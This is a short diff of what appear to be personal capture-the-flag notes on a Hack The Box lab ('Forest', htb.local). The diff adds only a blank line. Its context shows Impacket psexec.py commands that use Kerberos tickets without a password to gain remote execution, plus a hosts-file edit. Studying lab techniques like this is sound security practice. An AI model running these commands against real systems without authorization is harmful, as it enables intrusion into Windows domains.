@@ -82,6 +82,7 @@ python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
 psexec.py -debug -k -no-pass htb.local/Wedontexist@forest
 ```
 
+
 Have to done changes to the host file
 added - htb.local & forest
 ![[Pasted image 20231116175043.png]]
